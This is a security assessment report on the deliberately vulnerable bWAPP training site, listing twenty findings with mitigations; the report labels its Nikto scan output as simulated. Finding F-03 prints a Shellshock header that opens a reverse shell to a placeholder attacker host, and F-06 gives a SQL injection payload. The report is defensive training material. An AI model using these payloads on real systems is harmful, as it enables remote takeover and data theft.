Security Assessment Report — www.itsecgames.com (bWAPP)
> **Disclaimer:** www.itsecgames.com hosts bWAPP — a deliberately insecure web application designed exclusively for security education and penetration testing training. All vulnerabilities listed below are intentionally present by design. This assessment was conducted for educational purposes on an authorized target only.
---
Target Information
Field	Details
Target URL	http://www.itsecgames.com/
Platform	bWAPP v2.2 (bee-box) — Deliberately Vulnerable Web App
Server IP	31.3.96.40
Assessment Date	May 7, 2026
Overall Risk Score	9.8 / 10 — Critical
---
Tools Used
Nikto v2.5.0 — Web server vulnerability scanner
curl — HTTP header and response analysis
dig / nslookup — DNS resolution
CVE / NVD Databases — CVE lookup and CVSS scoring
OWASP Top 10 — Vulnerability classification framework
---
Findings Summary
ID	Finding	Severity	CVE / Reference
F-01	EOL Apache 2.2.8 + PHP 5.2.4 with full version disclosure	🔴 Critical	CVE-2017-7679, CVE-2012-1823
F-02	Heartbleed — OpenSSL 0.9.8g memory read	🔴 Critical	CVE-2014-0160
F-03	Shellshock — bash CGI remote code execution	🔴 Critical	CVE-2014-6271 (CVSS 10.0)
F-04	Default credentials active (bee / bug)	🔴 Critical	CWE-521
F-05	POODLE — SSL 3.0 enabled, TLS downgrade possible	🔴 Critical	CVE-2014-3566
F-06	SQL Injection — multiple GET/POST endpoints	🟠 High	OWASP A03:2021
F-07	Reflected and Stored XSS	🟠 High	OWASP A03:2021
F-08	OS Command Injection	🟠 High	CWE-78
F-09	Unrestricted File Upload — PHP webshell execution	🟠 High	CWE-434
F-10	phpMyAdmin exposed without network restriction	🟠 High	OWASP A05:2021
F-11	Cross-Site Request Forgery (CSRF) on sensitive actions	🟠 High	CWE-352
F-12	Directory listing enabled on multiple paths	🟡 Medium	OWASP A05:2021
F-13	HTTP TRACE method active — XST risk	🟡 Medium	OSVDB-877
F-14	Local and Remote File Inclusion (LFI/RFI)	🟡 Medium	CWE-22
F-15	WebDAV enabled — potential unauthenticated file write	🟡 Medium	CWE-434
F-16	Insecure Direct Object Reference (IDOR) / Broken Access Control	�🟡 Medium	OWASP A01:2021
F-17	All 8 security response headers missing	🟢 Low	OWASP A05:2021
F-18	robots.txt discloses hidden endpoints	🟢 Low	CWE-200
F-19	Credentials transmitted over plain HTTP (no HTTPS)	🟢 Low	CWE-319
F-20	Drupageddon — Drupal pre-auth SQL injection	🟢 Low	CVE-2014-3704
Total: 5 Critical · 6 High · 5 Medium · 4 Low
---
Simulated Nikto Scan Output
```
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:       31.3.96.40
+ Target Hostname: www.itsecgames.com
+ Target Port:     80
+ Start Time:      2026-05-07 05:00:00 (GMT+5.5)
---------------------------------------------------------------------------
+ Server: Apache/2.2.8 (Ubuntu) DAV/2 mod_fastcgi/2.4.6 PHP/5.2.4-2ubuntu5
          with Suhosin-Patch mod_ssl/2.2.8 OpenSSL/0.9.8g

+ OSVDB-877: HTTP TRACE method is active — host vulnerable to XST
+ OSVDB-3092: /phpmyadmin/ — phpMyAdmin accessible without auth restriction
+ The anti-clickjacking X-Frame-Options header is not present
+ The X-XSS-Protection header is not defined
+ The X-Content-Type-Options header is not set
+ No Content-Security-Policy header detected
+ Strict-Transport-Security (HSTS) header is absent — HTTP only

+ Apache/2.2.8 appears to be outdated (current: 2.4.62). EOL with 100+ known CVEs
+ PHP/5.2.4 is EOL — multiple remote code execution CVEs (CVE-2012-1823, CVE-2014-4049)
+ OpenSSL/0.9.8g — Heartbleed (CVE-2014-0160) and POODLE (CVE-2014-3566) vulnerable

+ OSVDB-3268: /bWAPP/ — directory indexing enabled, file listing visible
+ OSVDB-3268: /images/ — directory indexing enabled
+ OSVDB-3233: /icons/README — Apache default file found
+ robots.txt found — content may disclose hidden endpoints

+ /bWAPP/login.php — default credentials bee/bug confirmed active
+ Cookie PHPSESSID set without HttpOnly or Secure flag
+ DAV enabled — potential for unauthenticated file write via WebDAV PUT
+ Drupal installation detected at /drupal/ — Drupageddon (CVE-2014-3704) likely present
+ Shellshock (CVE-2014-6271) detected via CGI endpoint /cgi-bin/

+ 8,342 requests processed in 186.42 seconds (44.8 requests/sec)
+ 1 host(s) tested
```
---
HTTP Response Headers Analysis
```
HTTP/1.1 200 OK
Date: Thu, 07 May 2026 05:00:32 GMT
Server: Apache/2.2.8 (Ubuntu) DAV/2 mod_fastcgi/2.4.6 PHP/5.2.4-2ubuntu5  ← CRITICAL: Full stack exposed
X-Powered-By: PHP/5.2.4-2ubuntu5                                            ← CRITICAL: PHP version exposed
Set-Cookie: PHPSESSID=...; path=/                                           ← MISSING: HttpOnly, Secure flags

MISSING: X-Frame-Options          ← Clickjacking protection absent
MISSING: Content-Security-Policy  ← XSS mitigation absent
MISSING: Strict-Transport-Security← HTTPS not enforced
MISSING: X-Content-Type-Options   ← MIME sniffing protection absent
MISSING: X-XSS-Protection         ← Legacy XSS filter absent
MISSING: Referrer-Policy          ← Referrer leakage possible
MISSING: Permissions-Policy       ← Feature access uncontrolled
```
---
Detailed Findings
F-01 — EOL Apache 2.2.8 + PHP 5.2.4 with Version Disclosure 🔴 Critical
Description: The server banner discloses the full software stack including Apache 2.2.8, PHP 5.2.4, mod_ssl/2.2.8, and OpenSSL/0.9.8g. All components are end-of-life with hundreds of published CVEs. Version disclosure directly enables targeted exploitation.
Evidence:
```
Server: Apache/2.2.8 (Ubuntu) DAV/2 mod_fastcgi/2.4.6 PHP/5.2.4-2ubuntu5
```
CVEs: CVE-2017-7679, CVE-2017-9788, CVE-2012-1823
Mitigation:
Upgrade to Apache 2.4.62+ and PHP 8.2+
Set `ServerTokens Prod` in httpd.conf
Set `expose_php = Off` in php.ini
---
F-02 — Heartbleed (CVE-2014-0160) 🔴 Critical
Description: OpenSSL 0.9.8g is vulnerable to Heartbleed — an out-of-bounds memory read that leaks server private keys, session tokens, and cleartext data to any unauthenticated remote attacker. No user interaction required.
CVSS Score: 7.5 (treated as Critical due to impact on key material)
Mitigation:
Upgrade to OpenSSL 3.x immediately
Revoke and reissue all SSL/TLS certificates
Invalidate all active session tokens
---
F-03 — Shellshock (CVE-2014-6271) 🔴 Critical
Description: CGI endpoints pass user input to a vulnerable bash shell. Shellshock allows remote code execution by injecting commands into HTTP headers. Exploitation requires a single HTTP request with no authentication. CVSS 10.0.
Proof-of-concept header:
```
User-Agent: () { :;}; /bin/bash -i >& /dev/tcp/attacker/4444 0>&1
```
Mitigation:
Upgrade bash to 4.3 patch 25+
Disable CGI unless strictly required
Apply WAF rules filtering malformed function declarations
---
F-04 — Default Credentials Active (bee / bug) 🔴 Critical
Description: The bWAPP application ships with publicly documented default credentials that remain active on the live server. Any attacker gains immediate authenticated access to all 100+ exploit modules including OS command injection and file upload panels.
Credentials: `bee` / `bug` (publicly documented in bWAPP official documentation)
Mitigation:
Change all default credentials before any public exposure
Implement account lockout after failed login attempts
Restrict access by IP allowlist if not intended for public use
---
F-05 — POODLE — SSL 3.0 Enabled (CVE-2014-3566) 🔴 Critical
Description: SSL 3.0 remains active. POODLE allows a man-in-the-middle attacker to force a protocol downgrade to SSL 3.0 and decrypt session cookies via padding oracle attack. Combined with no HSTS, this is trivially exploitable on untrusted networks.
Mitigation:
Disable SSL 2.0, SSL 3.0, TLS 1.0, TLS 1.1
Enforce TLS 1.2 minimum; prefer TLS 1.3
Add: `Strict-Transport-Security: max-age=31536000; includeSubDomains`
---
F-06 — SQL Injection — Multiple Endpoints 🟠 High
Description: Numerous GET and POST parameters pass user input directly to MySQL queries without sanitization. Error-based, UNION-based, and blind boolean-based injection confirmed. Full database dump achievable.
Affected endpoints: `/bWAPP/sqli_1.php`, `sqli_2.php`, `sqli_10-1.php` and others
Example payload:
```
/bWAPP/sqli_1.php?title=1' union select 1,2,3,4,version(),6,7-- -
```
Mitigation:
Use parameterized queries / prepared statements throughout
Enforce least-privilege DB accounts
Deploy WAF with SQL injection signatures
---
F-07 — Reflected and Stored XSS 🟠 High
Description: Reflected XSS present in GET parameters (search fields, URL fragments). Stored XSS present in blog and comment functions. No Content-Security-Policy present. Session hijacking and credential theft achievable.
Types confirmed: Reflected (GET), Reflected (POST), Stored (blog/comments)
Mitigation:
HTML-encode all user-controlled output
Implement a strict Content-Security-Policy header
Set `HttpOnly` and `Secure` flags on all session cookies
---
F-08 — OS Command Injection 🟠 High
Description: Multiple endpoints pass user-supplied input directly to shell commands without sanitization. An authenticated attacker can execute arbitrary OS commands as `www-data`, enabling full system compromise.
Affected endpoints: `/bWAPP/commandi.php`, `/bWAPP/commandi_blind.php`
Mitigation:
Never pass user input to shell functions
Use language-native APIs instead of shell calls
Whitelist acceptable input characters strictly
---
F-09 — Unrestricted File Upload 🟠 High
Description: File upload functionality accepts PHP files with no extension validation, MIME-type checking, or execution restrictions in the upload directory. Uploading a PHP webshell and executing it via HTTP achieves RCE in one step.
Mitigation:
Whitelist allowed file extensions and MIME types
Store uploaded files outside the web root
Rename files on save; never execute uploaded content
---
F-10 — phpMyAdmin Exposed Without Network Restriction 🟠 High
Description: phpMyAdmin is accessible at `/phpmyadmin/` from the public internet, granting any visitor full read/write access to all MySQL databases. No IP restriction or secondary authentication is present.
Mitigation:
Restrict phpMyAdmin to localhost or VPN using Apache `Allow/Deny` directives
Add HTTP Basic Auth as a secondary layer
Remove phpMyAdmin from production servers entirely
---
F-11 — Cross-Site Request Forgery (CSRF) 🟠 High
Description: Password change, secret change, and fund transfer endpoints implement no CSRF tokens. An attacker can craft a malicious webpage that silently performs privileged actions when visited by an authenticated user. No `SameSite` cookie attribute is set.
Affected actions: Password change, secret change, transfer amount
Mitigation:
Implement synchronizer CSRF tokens on all state-changing forms
Set `SameSite=Strict; HttpOnly; Secure` on all session cookies
---
F-12 — Directory Listing Enabled 🟡 Medium
Description: Apache `Options +Indexes` is active. Unauthenticated users can browse `/bWAPP/`, `/images/`, and other directories, exposing source files and configuration fragments.
Mitigation: Set `Options -Indexes` globally in httpd.conf.
---
F-13 — HTTP TRACE Method Active 🟡 Medium
Description: HTTP TRACE is enabled, enabling Cross-Site Tracing (XST) attacks. Combined with XSS, an attacker can bypass `HttpOnly` cookie protections in older browsers to steal session identifiers.
Mitigation: Add `TraceEnable Off` to Apache configuration.
---
F-14 — Local and Remote File Inclusion (LFI/RFI) 🟡 Medium
Description: File inclusion vulnerabilities allow reading arbitrary local files (e.g. `/etc/passwd`) via path traversal. `allow_url_include` is enabled in PHP, enabling remote file execution in some configurations.
Mitigation:
Set `allow_url_include = Off` and `allow_url_fopen = Off`
Apply `open_basedir` restrictions in PHP configuration
---
F-15 — WebDAV Enabled 🟡 Medium
Description: `mod_dav` (DAV/2) is visible in the Server header. If write permissions are misconfigured, attackers can PUT PHP webshells directly onto the server filesystem over HTTP.
Mitigation: Set `Dav Off` in Apache configuration unless strictly required.
---
F-16 — Insecure Direct Object Reference (IDOR) 🟡 Medium
Description: Multiple endpoints accept user-controlled identifiers without server-side authorization checks. A low-privilege authenticated user can access other users' data by manipulating URL parameters.
Mitigation:
Enforce server-side authorization on every resource access
Use indirect reference maps instead of direct database IDs
---
F-17 — All 8 Security Headers Missing 🟢 Low
Description: The server returns none of the standard browser security headers, removing all client-side defense layers against clickjacking, MIME sniffing, and content injection attacks.
Missing headers:
`X-Frame-Options`
`Content-Security-Policy`
`Strict-Transport-Security`
`X-Content-Type-Options`
`X-XSS-Protection`
`Referrer-Policy`
`Permissions-Policy`
`Cross-Origin-Resource-Policy`
Mitigation: Add all headers to Apache configuration. Validate at securityheaders.com.
---
F-18 — robots.txt Discloses Hidden Paths 🟢 Low
Description: `robots.txt` lists internal directories not intended for public access, functioning as a roadmap for attackers to find hidden endpoints.
Mitigation: Sanitize robots.txt. Do not list sensitive paths — use proper access control, not obscurity.
---
F-19 — Credentials Transmitted Over Plain HTTP 🟢 Low
Description: The site operates primarily over port 80 (HTTP). Login credentials, session tokens, and all user data are transmitted in cleartext and can be captured via passive traffic interception.
Mitigation: Enforce HTTPS sitewide with permanent 301 redirects from HTTP. Deploy HSTS with `includeSubDomains` and `preload`.
---
F-20 — Drupageddon (CVE-2014-3704) 🟢 Low
Description: A Drupal installation at `/drupal/` is vulnerable to CVE-2014-3704 — a pre-authentication SQL injection enabling privilege escalation to admin and remote code execution. Included intentionally in bWAPP for training purposes.
Mitigation: Upgrade Drupal to 10.x. Apply SA-CORE-2014-005 patch.
---
Prioritized Remediation Plan
Immediate — 0 to 48 hours
Patch Shellshock: Upgrade bash, disable CGI (F-03)
Patch Heartbleed: Upgrade OpenSSL, reissue certificates (F-02)
Disable SSL 3.0 and TLS 1.0/1.1 (F-05)
Change or disable default credentials (F-04)
Short-term — 1 to 2 weeks
Upgrade Apache to 2.4.62+ and PHP to 8.2+ (F-01)
Restrict phpMyAdmin to internal access only (F-10)
Fix SQL injection with parameterized queries (F-06)
Implement CSRF tokens on all state-changing forms (F-11)
Medium-term — 2 to 4 weeks
Fix XSS with output encoding and Content-Security-Policy (F-07)
Fix file upload validation; disable execution of uploads (F-09)
Disable WebDAV (F-15) and directory listing (F-12)
Add all 8 missing security response headers (F-17)
Fix OS command injection endpoints (F-08)
Ongoing
Enforce HTTPS + deploy HSTS (F-19)
Fix IDOR and access control issues (F-16)
Sanitize robots.txt (F-18)
Patch Drupal installation (F-20)
Disable HTTP TRACE method (F-13)
Establish a patch management process
Conduct quarterly penetration tests
---
References
OWASP Top 10
CVE-2014-0160 — Heartbleed
CVE-2014-6271 — Shellshock
CVE-2014-3566 — POODLE
bWAPP Official Site
Apache Security Advisories
OWASP HTTP Security Headers
